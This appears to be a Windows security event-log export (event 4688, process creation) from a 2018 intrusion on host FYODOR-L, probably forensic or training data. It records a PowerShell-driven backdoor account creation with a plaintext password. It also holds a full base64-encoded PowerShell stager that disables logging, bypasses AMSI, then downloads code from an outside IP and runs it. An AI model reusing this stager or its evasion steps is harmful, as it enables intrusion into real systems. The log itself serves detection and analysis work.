	New Process ID:		0x2648
	New Process Name:	C:\Windows\System32\net.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\net.exe"" user /add svcvnc Password123!

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:07:06.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x18d8
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1124
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABzAGUAewBbAFMAQwBSAEkAcABUAEIATABvAEMASwBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAdQBFACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBKAEUAYwBUACAAQwBPAGwATABFAEMAVABJAE8ATgBTAC4ARwBlAG4ARQByAGkAQwAuAEgAQQBTAEgAUwBFAFQAWwBzAFQAUgBpAG4ARwBdACkAKQB9ACQAUgBlAEYAPQBbAFIARQBGAF0ALgBBAFMAcwBFAE0AQgBMAFkALgBHAGUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAEwAdQBFACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AUwBFAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAE4AYQBHAEUAUgBdADoAOgBFAFgAUABlAEMAdAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAFcAQwAuAEgARQBBAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBCAFIAZQBxAFUARQBTAHQAXQA6ADoARABlAGYAYQBVAGwAVABXAEUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBEAGUATgBUAGkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAFUAbABUAE4ARQB0AFcAbwByAGsAQwByAEUAZABlAG4AdABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAGUAeABUAC4ARQBuAEMATwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQBUAEUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAEkAbgBnAF0AOgA6AFUAbgBJAGMATwBEAEUALgBHAEUAdABTAFQAcgBpAG4ARwAoAFsAQwBvAG4AdgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBzAGUANgA0AFMAdAByAGkATgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAYQBEAEUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBoAEIAMgBIADAARwBUAEkAcAB3AHgAQwBlAEwAaABHAGUALwBmAEwAawBmAEIAcABDAGQASQA9ACIAKQA7ACQAZABhAFQAQQA9ACQAdwBDAC4ARABPAFcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAHMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAEcAVABIAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:07:06.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x23f8
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1124
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
